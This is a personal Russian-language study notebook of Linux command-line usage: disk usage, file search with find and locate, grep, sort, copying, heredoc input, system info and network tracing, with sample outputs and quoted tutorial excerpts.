 = = = оЦЕНИТЬ РАЗМЕР ЗАДЕЙСТВОВАНИЯ раздела файловой системы = = =    
du / #оценить задействование диска disk usage
du --inodes #оценить использование индексных дескрипторов inodes в тек. каталоге
df -i #информация о кол-ве СВОБОДНЫХ ОСТАЮЩИХСЯ i-node inode на разделах !
du -h / # оценить использование занимаемого файлами места на диска в Мбайтах ВСЕГО дерева каталогов
du -sh ~/  #оценить использование СУММАРНО(!!без вывода файлов!!) заним файлами места на диска в Мбайтах текущего каталога
254M /home/oem/
du -sh ~/*
8,0K    /home/oem/555
444K    /home/oem/arx2.tar

du -hd 5 /lib/ //вывести СУММАРНО всех файлов  каталога /lib/, !!!
  // а также список/размер всех файлов в дочерних каталогах с клубиной 5 шагов
...
48K     /lib/firmware/yamaha
12K     /lib/firmware/inside-secure/eip197_minifw
28K     /lib/compiz/migration
32K     /lib/compiz
4,0K    /lib/linux/triggers
28K     /lib/modprobe.d
52K     /lib/apg
8,0K    /lib/pkgconfig
...
5,0G    /lib/







СРАВНЕНИЕ УТИЛИТ WHICH И WHEREIS
 Утилита which («которая») ведет по очереди поиск по каталогам, включенным в ваш путь поиска (см.раздел «Переменная окружения PATH: Указание тех мест, где оболочка ищет программы», и находит указанную утилиту. Если в вашем пути поиска содержится более одной утилиты с указанным именем, утилита which отображает имя только первой из них (той, которая будет запущена при выполнении команды).

 Утилита whereis ищет в стандартных каталогах, работая независимо от вашего пути поиска. Утилиту whereis следует использовать для определения местонахождения бинарного (исполняемого) файла, а также любых страниц руководства и исходного кода для указанной вами программы; утилита whereis отображает все найденные ею файлы
whatis ls
whereis --help > ~/whereishlp2.txt  // записать в файл
whereis --help | cat > ~/whereishlp.txt // передать в cat и записать в файл
			 = = = = =  locate  = = = = =
locate gcc // поиск файлов по именам В БАЗЕ ДАННЫХ ИМЕН. ПОДРОБНЫЙ СПИСОК Всех папок, где встречается файл с "gcc"
locate bin/zip // поиск в базе данных имен файлов сод-щих строку bin/zip. ТЕ всех файлы                // zip из /bin/

  = = = = =Файлы устройств символьных и блоковых = = = = =
Кетов Книга 3.2.5 Специальные файлы устройств
Специальные файлы устройств предназначены для ВВОДА данных с аппаратных устройств и ВЫВОДА
 данных на них. Настоящую работу по вводу и выводу данных проделывает драйвер устройства, а 
специальные файлы (листинг 3.13) играют роль своеобразных «порталов» связи с драйверами. !!!!!!!
Различают символьные с и блочные b специальные файлы устройств, у которых минимальной 
единицей обмена информацией с драйверами является блок (обычно размером в 512 байт) или
 символ (1 байт), соответственно. 

sudo find / -type b 2>/dev/null // найти все файлы блоковых устройств
/run/systemd/inaccessible/blk
/dev/md22
/dev/sdb4
/dev/sdb3
/dev/sdb2
/dev/sdb1
/dev/sdb
/dev/sda4
/dev/sda3
/dev/sda2
/dev/sda1
/dev/sda
/dev/sr0
/dev/loop7
...
/dev/loop0
sudo find / -type c 2>/dev/null // найти все файлы символьных устройств
...
/dev/ppp
/dev/net/tun
/dev/udmabuf
/dev/dma_heap/system
/dev/loop-control
/dev/hwrng
/dev/hpet
/dev/ttyprintk
/dev/ttyS31
....
/dev/urandom
/dev/random
/dev/full
/dev/zero
/dev/port
/dev/null

                     ############# locate+FIND 1 #####################
!! find /dev/ вторая '/' - ОБЯЗАТЕЛЬНА!!
!! find /lib/ вторая '/' - ОБЯЗАТЕЛЬНА!!
ОЧень желательно брать в " " или ' ' маски поиска файлов *.abc ...

! locate /lib/modules/5.15.0-56-generic/lp.ko альтернтива для find /../.. -name abc
find /  // поиск файлов в иерархии каталогов
find dir/f* -ls /!!!/ вывести файлы, начин-ся на f, в полном формате команды "ls -il"
find / -user linda // найти все файлы от пользователя линда
find /dev/ -name cpu // найти файл c именем cpu
    /dev/cpu
find /dev/ -name "*cpu*" // найти все файлы c именем, содержащим cpu !!!!!
   /dev/cpu
   /dev/cpu_dma_latency

!!!! ВАЖНО ЭКРАНИРОВАТЬ (брать в "") ШАБЛОННЫЕ ВЫРАЖЕНИЯ В ПОИСКЕ ПО ИМЕНИ в find !!!!
find ~ -name "*cp*"
/home/oem/f3.cpi
/home/oem/cpgrcnf2
/home/oem/.config/procps
                             !!!!
find ~ -name *cp* // ошибка в выводе или неполный поиск/вывод
find: paths must precede expression: `f3.cpi'
find: possible unquoted pattern after predicate `-name'?
!!!! ВАЖНО ЭКРАНИРОВАТЬ (брать в "") ШАБЛОННЫЕ ВЫРАЖЕНИЯ В ПОИСКЕ ПО ИМЕНИ в find !!!!

find / -perm /u+s -ls 2>/dev/null // найти файлы с битом передачи прав (s),
    // результат вывести в СТИЛЕ ls !!, при этом ! ОШИБКИ доступа к файлам - сбросить в /dev/null
     4426     47 -rwsr-xr-x   1 root     root        47480 фев 21  2022 /bin/mount
     4475     40 -rwsr-xr-x   1 root     root        40496 ноя 24 15:05 /bin/newgrp
     4559     59 -rwsr-xr-x   1 root     root        59976 ноя 24 15:05 /bin/passwd
     4619     31 -rwsr-xr-x   1 root     root        30872 фев 26  2022 /bin/pkexec
     4905     55 -rwsr-xr-x   1 root     root        55672 фев 21  2022 /bin/su
     4906    227 -rwsr-xr-x   1 root     root       232416 авг  4 13:35 /bin/sudo
     5017     35 -rwsr-xr-x   1 root     root        35192 фев 21  2022 /bin/umount
find /bin/c* -ls
find ~ | grep f.txt // файл f.txt найти и выделить красным
find * | wc -l // посчитать кол-во файлов в ОС linux
find dir/ -name file -print // отыскать файл file в каталоге dir
find ~ -type f -name "*.JPG" -size +1M //
find / -type f -name "zip" > fout // если задать условие поиска по всех дир-риям (/), то find передаст в файл И выдаст результат равно на экран
find ~ -name 'f*5' // поиск по МАСКЕ Д.Б. в ' '/" "!!!, найти имя нач-ся на 'f' и закан-ся '5'
find /bin/ -type f  | grep zip$ // $ якорь завершающий, найти файлы, заканчив-ся на 'zip'
/bin/funzip
/bin/streamzip

find ~ -type d | wc -l // счет кол-ва каталогов 
{type=
b Специальный файл блочного устройства
c Специальный файл символьного устройства
d Каталог
f Обычный файл
l Символическая ссылка}
find ~ -type f -name "*.JPG" -size +1M | wc -l
{Единицы измерения, поддерживаемые командой find
Символ Единица измерения
b Блоки размером по 512 байт (используется по умолчанию, если иное не указано явно)
c Байты
w 2-байтные слова
k Килобайты (Kilobytes, блоки по 1024 байт)
M Мегабайты (Megabytes, блоки по 1 048 576 байт)
G Гигабайты (Gigabytes, блоки по 1 073 741 824 байт) }

= = = киби миби гиби кило мега = = = 
Правильно кило=1000. Доказательства:
1) https://man7.org/linux/man-pages/man1/hexdump.1.html
2) Man du



find /dev/tty? // вывести все файлы в конце имени которых 1 любой символ
/dev/tty0 /dev/tty1 /dev/tty2 /dev/tty3 /dev/tty4 /dev/tty5 /dev/tty6 /dev/tty7 /dev/tty8 /dev/tty9
ls /dev/tty?
/dev/tty0  /dev/tty2  /dev/tty4  /dev/tty6  /dev/tty8
/dev/tty1  /dev/tty3  /dev/tty5  /dev/tty7  /dev/tty9

find /dev/tty[1247] //вывести все файлы в конце имени которых символы из множества 1247
/dev/tty1  /dev/tty2  /dev/tty4  /dev/tty7

find /dev/tty{1..3} // вывести все файлы в конце имени которых ОДИН символ из множества {1..3}
/dev/tty1 /dev/tty2 /dev/tty3

 find /dev/tty{11..23}  // вывести все файлы в конце имени которых ДВА символа из множества {11..23}
   /dev/tty11 /dev/tty12 .... /dev/tty23

                      ## FIND 2 ##
!! find /dev/ вторая '/' - ОБЯЗАТЕЛЬНА!!
!! find /lib/ вторая '/' - ОБЯЗАТЕЛЬНА!!

-Командная строка Linux. Полное руководство ( PDFDrive ).pdf

find / -perm 744 -ls  2>/dev/null // найти файлы с маской разрешений 744
   262419     20 -rwxr--r--   1 root     root        18744 апр 11  2022 /usr/lib/cups/backend/serial
   262417     24 -rwxr--r--   1 root     root        22832 мая 27  2022 /usr/lib/cups/backend/mdns
   262423     36 -rwxr--r--   1 root     root        35120 мая 27  2022 /usr/lib/cups/backend/usb
 find ~ \( -type f -not -perm 0600 \) -or \( -type d -not -perm 700 \)

find // запуск без параметров  в каталоге выведетсписок всех файлов в каталоге
find / -name lsscsi 2>/dev/null //поиск по имени

find -mtime 0 // найти все файлы , измененные/созданные за послединений день/ 24 часа
find -cmin -60 //Найти файлы измененные в течении часа 60 мин

                !! https://losst.pro/komanda-FIND-v-linux !!
Команда find имеет такой синтаксис:

find [папка] [параметры] критерий шаблон [действие]
Папка - каталог в котором будем искать
Параметры - дополнительные параметры, например, глубина поиска, и т д
Критерий - по какому критерию будем искать: имя, дата создания, права, владелец и т д.
Шаблон - непосредственно значение по которому будем отбирать файлы.

Основные параметры команды find (самые полезные)
-P - никогда не открывать символические ссылки.
-L - получает информацию о файлах по символическим ссылкам. Важно для дальнейшей обработки, чтобы обрабатывалась не ссылка, а сам файл.
-maxdepth - максимальная глубина поиска по подкаталогам, для поиска только в текущем каталоге установите 1.
-depth - искать сначала в текущем каталоге, а потом в подкаталогах.
-mount искать файлы только в этой файловой системе.
-version - показать версию утилиты find.
-print - выводить полные имена файлов.
-type f - искать только файлы.
-type d - поиск папки в Linux.
Критерии (основные)
-name - поиск файлов по имени.
-perm - поиск файлов в Linux по режиму доступа.
-user - поиск файлов по владельцу.
-group - поиск по группе.
-mtime - поиск по времени модификации файла.
-atime - поиск файлов по дате последнего чтения.
-nogroup - поиск файлов, не принадлежащих ни одной группе.
-nouser - поиск файлов без владельцев.
-newer - найти файлы новее чем указанный.
-size - поиск файлов в Linux по их размеру.

1. Поиск всех файлов
Показать все файлы в текущей директории:
 find =  find .  ==  find . -print
2. Поиск файлов в определенной папке
Показать все файлы в указанной директории:
find ./Изображения
Искать файлы по имени в текущей папке:
 find . -name *.png
Поиск по имени в текущей папке:
find . -name "testfile*"
Не учитывать регистр при поиске по имени:
 find . -iname "TeStFile*"
3.Ограничение глубины поиска. Поиск файлов по имени в Linux только в этой папке:
 find . -maxdepth 1 -name "*.php"
4. Инвертирование шаблона. Найти файлы, которые не соответствуют шаблону:
 find . -not -name "test*"
5. Несколько критериев.Поиск по нескольким критериям, с оператором исключения/кроме:
 find . -name "test*" -not -name "*.php" Найдет все файлы, начинающиеся на test, но без расширения php. 
 find ~ -not -name '.*' -exec ls -ilh '{}' ';' // найти все файлы, кроме скрытых

А теперь рассмотрим оператор ИЛИ:
 find -name "*.doc" -o -name "*.txt" Эта команда найдёт как doc, так и txt файлы.
6. Тип файла/ По умолчанию find ищет и каталоги,и файлы. Если необходимо найти только каталоги, используйте критерий type с параметром d.
Например: find . -type d -name "Загрузки"
find -type f -o -type d | wc -l //  посчитать кол-во файлов и каталогов 
Для поиска только файлов необходимо использовать параметр f: find . -type f -name "Загрузки"
7. Несколько каталогов Искать в двух каталогах одновременно:
 find ./test ./test2 -type f -name "*.c"
8. Поиск скрытых файлов в текущей папке. Имена скрытых файлов в Linux начинаются с точки:
find . -maxdepth 1 -type f -name ".*"
find -maxdepth 5 -type d -name ".*" // поиск скрытых каталогов
8. Поиск по разрешениям. Найти файлы с  маской прав, например, 0664:
 find . -type f -perm 0664
Права также можно задавать буквами для u (user) g (group) и o (other). Например, для того чтобы найти все файлы с установленным флагом Suid в каталоге /usr выполните:
sudo find /usr -type f -perm /u=s
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/sbin/pppd
Поиск файлов доступных владельцу только для чтения только в каталоге /etc:
 find /etc -maxdepth 1 -perm /u=r
Найти только исполняемые (для всех категорий пользователей user group other = a) файлы :
 find /usr/bin -type f -perm /a=x -ls 

find ~ -type f -perm  /u=x,g=x,o=x | wc -l // 2й вариант-НАЙТИ ИСПОЛЯНЕМЫЕ ФАЙЛЫ, ПОСЧИТАТЬ КОЛ_ВО
9. Поиск файлов в группах и пользователях Найти все файлы, принадлежащие пользователю:
 find . -user sergiy
Поиск файлов в Linux принадлежащих группе:  find /dev -group disk -ls
10. Поиск по дате модификации
Поиск файлов по дате в Linux осуществляется с помощью параметра mtime. Найти все файлы модифицированные 5 дней назад: find / -mtime 5
Поиск файлов в Linux открытых N дней назад: find / -atime N
Найти все файлы, модифицированные между 50 и 100 дней назад: find / -mtime +50 -mtime -100
Найти файлы измененные в течении часа: find . -cmin 60
11. Поиск файлов по размеру Найти все файлы размером 50 мегабайт: find / -size 50M
От пятидесяти до ста мегабайт: find / -size +50M -size -100M
Найти самые маленькие файлы: find . -type f -exec ls -s {} \; | sort -n -r | head -5
Найти Самые большие:  find . -type f -exec ls -s {} \; | sort -n | head -5
sudo find -type f -name 'f*.*' -size +1c -size -100k -exec ls -ilh '{}' \ ';' //найти файлы на f более 1 байта и меннe 100B
12. Поиск ПУСТНЫХ файлов и КАТАЛОГОВ!  find /tmp -type f -empty;  find ~/ -type d -empty
13. Действия с найденными файлами. Для выполнения произвольных команд для найденных файлов используется опция -exec. Например, для того чтобы найти все пустые папки и файлы, а затем выполнить ls для получения подробной информации о каждом файле используйте:    find . -empty -exec ls -ld {} \; 

find / -type f -name locale -exec ls -ilh {} \; 2>/dev/null
135184 -rwxr-xr-x 1 root root 58K июл  7  2022 /usr/bin/locale
660093 -rwxr-xr-x 1 root root 576 июн  8  2022 /usr/lib/ubiquity/console-setup/locale
132485 -rw-r--r-- 1 root root 263 мар 11 14:48 /etc/default/locale

!!!!!!!!!!!! Выражение '{}' ';'  =равносильно= {} \;   !!!!!!!!!!ПРобел между {} \; ВАЖНЫ!

# 
#"find -exec ls -s {} \;" см с223 "! Командная строка Linux. Полное руководство ( PDFDrive ).pdf"
-exec команда {} \;
где команда — это имя команды, {} — символическое представление текущего пути
к файлу и точка с запятой — обязательный разделитель, обозначающий конец команды. Следующий пример демонстрирует использование -exec для получения эффекта, аналогичного операции -delete: 
-exec rm '{}' ';' И снова, поскольку фигурные скобки и точка с запятой имеют специальное значение для командной оболочки, они должны заключаться в кавычки или экранироваться.
Возможно выполнять пользовательские операции интерактивно - заменить операцию -exec операцией -ok, перед выполнением каждой указанной команды будет выводиться запрос(?):
find ~ -type f -name 'foo*' -ok ls -l '{}' ';'
< ls ... /home/me/bin/foo > ? y

find ~/ -name 'test.txt' -exec cat {} \; // вывести на экран файл 'test.txt'
rm `find . -maxdepth 1 -size 0` // найти все пустые файлы и удалить их

# Для чего в команде "find -type f -exec rm -f {} \;" в конце скобки и слеш? ("{} \;") !!!!!!!
Ответ Вместо фигурных скобок и слеша подставляется имя найденного файла.
https://askubuntu.com/questions/339015/what-does-mean-in-the-find-command
http://web.archive.org/web/20130204072017/http://content.hccfl.edu/pollock/unix/findcmd.htm
Если вы запускаете find с помощью exec, элемент '{}' заменяется на имя каждого файла или каталога, 
найденного с помощью find (так что ls в вашем примере получает каждое найденное имя файла в
качестве аргумента — обратите внимание, что он вызывает ls или любую другую команду, которую вы 
укажете один раз для каждого найденного файла). Точка с запятой ';' завершает команду, выполняемую exec. Его нужно экранировать с помощью \, чтобы оболочка, которую вы запускаете внутри, не рассматривала его как собственный специальный символ, а скорее передала его для поиска.
#

SUID - сайт 
ZZZVVVVV + ^[^#]? telinit  
less ./.bash_history  - сохранение введенных команд GUI bash (не ssh)

 find ~/ -empty -type d -delete
Как видите, в find необязательно выполнять отдельную команду, утилита тоже умеет удалять. Вместо домашней папки, можно указать любой нужный вам путь: find /var/www/public_html/ -empty -type d -delete
Перед удалением вы можете подсчитать количество пустых папок:
 find /var/www/public_html/ -empty -type d | wc -l
 find ~/ -type f -empty -print0 | xargs -0 -I {} /bin/rm "{}"    

https://losst.pro/kak-udalit-katalog-linux?cmdurl=1
Удалить все текстовые файлы в tmp find /tmp -type f -name "*.txt" -exec rm -f {} \;
Удалить все файлы >100 мегабайт:find /home/bob/dir -type f -name *.log -size +100M -exec rm -f {} \;



cat f1 | grep text > f2 // найти строки в файле f1, содержашие "text", и записать в файл f2
ИДЕНТИЧНО 
grep text f1 > f2 // найти строки в файле f1, содержашие "text", и записать в файл f2
grep -i 'Cow' ~/* 2>/dev/null // найти во всех файлах дом.каталога слово "cow" с игнорированием  регистра                         //регистра. Сообщения об ошибках поиска сбрасывать в devnull, не выводить на экран
wc f.txt // посчитать размер строк и байт в f.txt
type cmd // показать тип Команды/Программы/ССлки на прграмму и путь ней !!!!!!! !!!!!!!!!!!!!!!!!!!!!!!!!!!!!

size /usr/bin/find // показать размер секций и общий размер бинарного файла
   text    data     bss     dec     hex filename
 266319    9152    2656  278127   43e6f /usr/bin/find

pwd // текущая дир-рия
uname -orv // тип ос релиз и версия ядра kernel 
uname -r // релиз версии ядра kernel 
5.15.0-56-generic
uname -a
Linux linuxhm 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
uname -v //  версия ядра kernel 
#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022
 
lsb_release -a // инф-ци о релизе Linux
No LSB modules are available.
Distributor ID: Linuxmint
Description:    Linux Mint 21.1
Release:        21.1
Codename:       vera

cat /etc/sudoers | grep ^[^#] //вывести строки файла, начинающиеся не с "#"(не закоментированные)
grep ^[^#]  /etc/sudoers //вывести строки файла, начинающиеся не с "#", что и предыд-ее, но не помеченное красным

grep '#*agent'  /etc/sudoers  // вывести строки из файла, начинающиеся на # и содержащие "agent"
  # "sudo scp" or "sudo rsync" should be able to use your SSH agent.
  # Ditto for GPG agent
grep '#*agent$'  /etc/sudoers //вывести строки из ф-ла,начинающиеся на # и заканчивающиеся "agent"
  # Ditto for GPG agent



grep '#*agent'  /etc/sudoers 

 grep password.*unix /etc/pam.d/*
/etc/pam.d/common-password:# used to change user passwords.  The default is pam_unix.
/etc/pam.d/common-password:password     [success=1 default=ignore]      pam_unix.so obscure yescrypt

ln -s ~/f.txt lnk_f // создать мягкую ссылку(ярлык на имя ф/дир)
ln file new_name_file //создать hardlink жесткую ссылку (допролнительное ИМЯ ф/дир), 
   всегда ссылается на inode свой файловой системы, нельзя сделать Жесткую ссылку 
   на файл из другой фаловой системы, для этого МЯГКАЯ ссылка 
cp -s file // вместо копии создает мягк ссылку на файл
cp -l file // вместо копии создает жестк ссылку на файл
cp -v -i // копировать с подтверждением и отображением
cp -a 
cat \!f.txt ~/dir/ // копировать ФАЙЛ, НАЧИНАЮЩ_СЯ С "!" (!f.txt)(наход-ся в ~) в папку dir
cp f1{,.bak} // скопировать файл f1 в f1.bak
cp file1 file2 // Скопирует file1 в file2. Если file2 существует, он будет затерт 
                  новым файлом file1. Если file2 отсутствует, он будет создан
cp -i file1 file2 // То же, что и выше, но если файл file2 существует, у пользователя 
                     будет запрошено подтверждение перед перезаписью файла
cp file1 file2 dir1 // Скопирует file1 и file2 в каталог dir1. Каталог dir1 должен существовать
cp dir1/* dir2 // С использованием группового символа. Скопирует все файлы из 
                  каталога dir1 в каталог dir2. Каталог dir2 должен существовать
cp -r/-a dir1 dir2 // Скопирует каталог dir1 (и все его содержимое Рекурсивно!) в каталог dir2. 
                    Если каталог dir2 не существует, его создадут

 = = =  sort = =  =
$ sort опции файл
Или $ команда | sort опции
Опции  утилиты sort.
-b - не учитывать пробелы
-d - использовать для сортировки только буквы и цифры
-i - сортировать только по ASCII символах
-n - сортировка строк linux по числовому значению
-r - сортировать в обратном порядке
-с - проверить был ли отсортирован файл
-o - вывести результат в файл
-u - игнорировать повторяющиеся строки
-m - объединение ранее отсортированных файлов
-k - указать поле по которому нужно сортировать строки, если не задано, сортировка выполняется по всей строке.
-t - использовать в качестве разделителя полей ваш символ вместо пробела.

 ls -l | sort -nk2 //. Для сортировки по числовому значению используется опция -n:

sort < f // вывести на экран осортированные по алф. строки файла
sort < f >> out // вывести в файл out осортированные по алф. строки файла f
sort // отсортировать строки, введенные в интерактивном режиме, после завершения ввода "ctrl-D"
ls -l | sort -k9 // сортир-ка по 9 стлб
 ls -l | sort -t "," -nk2,5 -k9 // сортировать данные по нескольким полям. Например, отсортируем вывод 
   ls по второму первично и вторично девятому полях:

grep abc f* // вывести строки на экран из файлов, начинающихся на  f, содержащих 'abc'
grep "text' * // вывести строки на экран из ВСЕХ файлов, содержащих 'text'
!grep 'No such' f* // вывести строки на экран из файлов, начинающихся на  f, содержащих фразу 'No such'
grep abc f* >> out // вывести строки в файл out из файлов, начинающихся на  f, содержащие 'abc'
grep -v abc f // вывести строки из файла, содержащие любые симолы кроме'abc'
grep "21.1 (Vera)" /lib/* >> lnx_cmd.txt 
grep "21.1 (Vera)" /lib/* // вывод результата поиска на экран
    ...
    grep: /lib/os-probes: Is a directory
   /lib/os-release:VERSION="21.1 (Vera)"
cmp f1 f2 № сравнить два файла, ВЫВЕСТИ ПЕРВОЕ ОТЛИЧИЕ В файлах. Если файлы идентичны, ничего не водится
diff -u f1 f2 # сравнить два файла, ВЫВЕСТИ ВСЕ ОТЛИЧИЯ В файлах. Если файлы идентичны, ничего не водится
diff -y f1 f2 # вывод в колонках

wc -l < f // вывести кол-во строк в файле f // посчитать количество строк
wc -w < f // вывести кол-во слов в файле f
wc ??.*  // вывести кол-во слов и строк в файлах с названиями из любых 2символов и любого расширения

cat -nE f.txt // печать f.txt консоль
cat \!f.txt // печать ФАЙл НАЧИН_СЯ С !f.txt
cat > f.txt  // создать f.txt (затереть предыдущий f.txt) и записать в него
> file  // создать file
cat >> f.txt // открыть f.txt и дополнить его пока не ctrl-D
    
* * режим ввода heredoc  q* *
 # ввод EOF end-of-file,  комбинация CTRL-D 
cat >> f.txt << EOF //открыть f.txt и дополнить его пока не будет ведено "EOF" или ctrl-d
cat << EOF >> f.txt //открыть f.txt и дополнить его в режиме heredoc пока не будет ведено "EOF" или ctrl-d
> line1
> linen

cat << FSTOP >> f.txt //открыть f.txt и дополнить его в режиме heredoc пока не будет ведено "FSTOP" или ctrl-d
> line1
> linen

cat >> f.txt // ввод в f пока не CTRL-D / EOF

* * * end режим ввода heredoc     * * *

  * * * Многостроковый ввод в файл вчерез echo * * * 
echo "word1\
word2 word3 word4  \
 word5 word6 word7  \
  end" >> /tmp/f   // обязательна закрывающая "!


cat f1 f2 >> f12  / copy f1+f2 to f12
cat f1 >> f2  / добавить содержимое  f1 в конец f2
cat wiki.html | grep 'wiki' // show strigs of file contains word 'wiki' 
cat wiki.html | grep -o 'wiki' // show only srtings from file with word 'wiki' 
cat wiki.html | grep -o 'wiki' | wc -l // show number of string with word 'wiki' in file 
cat wiki.html | grep -o 'wiki' | wc -w // show number of word 'wiki' in file 
cat res_sortpass | tail -4; cat res_sortpass |head -5 // показать последние 4 и первые 5 строки файла
curl -o wiki.html https://www.wikipedia.org/ // dowload url and save to disk file wiki.html

знаки табуляции \t и переноса строки \n, вертика табул \v, \b backspace выводятся только 
  в команде printf, в echo - нет, 
!!echo преобразует все знаки форматирвания в пробелы " "
спецзнаки см \t \n и др  см в  man printf, Некоторые \v не работают корректно через ssh!
 
printf "Hello1"'\t'"Hello2"'\n' >> f.t # дополнить файл Hello1  \tab  Hello2 \n
printf "\nline1\nline2\nline3\n" >> f.t #дополнить файл c НОВОЙ строки 3мя строками
printf "line1\nline2\nline3\n" | tee -a /tmp/f.t // дополнить файл ТРЕМЯ строками line1 line2 line3
printf " >> f.txt # ввод в стиле HEREDOC
line1
line2
"  // дополнить файл многострочным вводом
echo "Hello" >> f.txt // дополнить файл строкой "Hello" 
echo "Hello" | tee -a f.txt // дополнить в конец файла строку "Hello" 

 * * tee создать ф-л, добавить в ф-л * *
tee f.txt //создать файл, вводить в неготекст в режиме heredoc (см выше) пока не ctrl-d
tee -a f.txt // добавлять в файл строки в интерактивном режиме heredoc пока не ctrl-d
echo "ABCD...Z" | tee f.txt // Создать файл и добавить  строку, аналогично ">"!!!
echo "ABCD...Z" > f.txt // Создать файл и добавить  строку, или заменить содержимое файла
echo "ABCD...Z" | tee -a f.txt // добавить в файл строку, аналогично ">>"!!!!
echo "ABCD...Z" >> f.txt // добавить в файл строку

Редакторы тесктовые
nano f.txt
less f.txt
more f.txt

apt install libc6-dev // установить пакет библиотек libc stdio.h  
apt purge iperf // деинсталировать/удалить пакет и удалить все конфиг файлы

df (disk free) объем свободного диска
sdXY (sd=SCSI-DISK) - HDD SDD USB накопители X=a/b/с... - номер накопителя Y=1,2,3... номер тома на накопителе
sr - CD/DVD ROM
df -ah // объем всех устройств с "человеческим" (в КМбайт) формате
df -T // объем всех устройств dev с указние типа файловой системы
tmpfs          tmpfs      202324    1288    201036   1% /run
/dev/sr0       iso9660   2581332 2581332         0 100% /cdrom
tmpfs          tmpfs     1011608       0   1011608   0% /dev/shm
tmpfs          tmpfs      202320    1700    200620   1% /run/user/999
/dev/sde1      ext3        88652      32     83672   1% /home/mint/fldsk  
/dev/sde4      fuseblk   1015228   10952   1004276   2% /media/mint/6486663E4CCF1CBC //!!fat32/ntfs
/dev/sde2      fuseblk    409599   10063    399536   3% /media/mint/РќРѕРІС‹Р№ С‚РѕРј  //!!fat32/ntfs
/dev/sde5      ext2       457516     120    432976   1% /media/mint/d6aef018-84fd-4056-93fb-56168fac22f3 -


df -lh // объем всех устройств dev в байтах
findmnt // найти (оторбразить деревом) все смонтированны файловые системы, в т.ч. псевдоFS   
TARGET                        SOURCE     FSTYPE   OPTIONS
/                             /dev/sda1  ext4     rw,relatime,errors=remount-ro
├─/sys                        sysfs      sysfs    rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/security      securityfs security rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/cgroup            cgroup2    cgroup2  rw,nosuid,nodev,noexec,relatime,nsdelegate,
│ ├─/sys/fs/pstore            pstore     pstore   rw,nosuid,nodev,noexec,relatime
│ ├─/sys/firmware/efi/efivars efivarfs   efivarfs rw,nosuid,nodev,noexec,relatime
│ ├─/sys/fs/bpf               bpf        bpf      rw,nosuid,nodev,noexec,relatime,mode=700
│ ├─/sys/kernel/debug         debugfs    debugfs  rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/tracing       tracefs    tracefs  rw,nosuid,nodev,noexec,relatime
│ ├─/sys/kernel/config        configfs   configfs rw,nosuid,nodev,noexec,relatime
│ └─/sys/fs/fuse/connections  fusectl    fusectl  rw,nosuid,nodev,noexec,relatime
├─/proc                       proc       proc     rw,nosuid,nodev,noexec,relatime
│ └─/proc/sys/fs/binfmt_misc  systemd-1  autofs   rw,relatime,fd=30,pgrp=1,timeout=0,minproto
├─/dev                        udev       devtmpfs rw,nosuid,relatime,size=940556k,nr_inodes=2
│ ├─/dev/pts                  devpts     devpts   rw,nosuid,noexec,relatime,gid=5,mode=620,pt
│ ├─/dev/shm                  tmpfs      tmpfs    rw,nosuid,nodev,inode64
│ ├─/dev/hugepages            hugetlbfs  hugetlbf rw,relatime,pagesize=2M
│ └─/dev/mqueue               mqueue     mqueue   rw,nosuid,nodev,noexec,relatime
├─/run                        tmpfs      tmpfs    rw,nosuid,nodev,noexec,relatime,size=200688
│ ├─/run/lock                 tmpfs      tmpfs    rw,nosuid,nodev,noexec,relatime,size=5120k,
│ ├─/run/credentials/systemd-sysusers.service
│ │                           none       ramfs    ro,nosuid,nodev,noexec,relatime,mode=700
│ └─/run/user/29999           tmpfs      tmpfs    rw,nosuid,nodev,relatime,size=200684k,nr_in
│   └─/run/user/29999/gvfs    gvfsd-fuse fuse.gvf rw,nosuid,nodev,relatime,user_id=29999,grou
├─/mnt/sda-2                  /dev/sda2  ext4     rw,relatime
├─/boot/efi                   /dev/sda3  vfat     rw,relatime,fmask=0077,dmask=0077,codepage=
├─/media/oem/25763E5C58F9951B /dev/sdb3  fuseblk  rw,nosuid,nodev,relatime,user_id=0,group_id
├─/media/oem/7AE3-1839        /dev/sdb4  vfat     rw,nosuid,nodev,relatime,uid=29999,gid=2999
└─/media/oem/83baa45b-e4fe-4f42-b26d-4057bae87be2
                              /dev/md22  ext4     rw,nosuid,nodev,relatime,errors=remount-ro
findmnt /tmp // найти файловые системы  tmpfs
free  объем свободного ОЗУ 
               total        used        free      shared  buff/cache   available
Mem:         2071344      963300      119060      576116      988984      364624
Swap:              0           0           0
date
cal


 touch – изменяет времена, ассоциированные с файлом.
 stat – выводит статус файла (иинформацию об inode) или файловой системы.

printenv | less // печать переменных окружения
sleep 10; echo -e "Time's up\a"
bc (basic calculator) — интерактивный интерпретатор Си-подобного языка, позволяет выполнять вычисления с произвольно заданной точностью scale - задается в bc. 

V1=100 // присвоить переменной V1 занчение
echo "V1+V1="$((V1+V1)) // вывести сумму 2х V1 на экран
echo "2+2="$((2+2)) // вывести сумму 2+2 на экран
echo "2+2="$((2+2)) >> out// вывести сумму 2+2 в файл out
echo *.txt // список файлов txt
echo ??? // список файлов, имеющих название из 5х символов, включая расширение
ls *.txt // список файлов txt
echo * // список всех файлов
echo $(ls) // выполнить ls в одну строку


tracepath -n mpt.gov.by // трассировка маршрута, ключ -n - отключение разрешения url имен хопов
tracepath  It is similar to traceroute. However, it does not require superuser privileges and has no fancy options.
ethtool enp0s3 //  ethtool - query or control network driver and hardware settings  параметры карты, соответвующей интерфейсу ядра enp0s3 (eth0)
ethtool -i enp0s3 // отобразить драйвер ядра для интерфейса/int ethernet enp0s3
  driver: e1000
  version: 5.15.0-56-generic

tracert -d habr.ru # windows10
Tracing route to HABR.ru [178.248.233.33]
  1     2 ms     2 ms    35 ms  192.168.100.1
  2     3 ms     4 ms     3 ms  100.123.128.1
  3     7 ms     4 ms     4 ms  93.84.80.53
  ...
 12    15 ms    15 ms    16 ms  178.248.233.33
tracert/traceroute работет последовательно отправляя запросы, каждый раз увеличивая TTL на единицу
ping -i 1/2...т -n 3 habr.ru. Т.о клиент  получает  от маршрутизатора, на котором истек TTL, его  
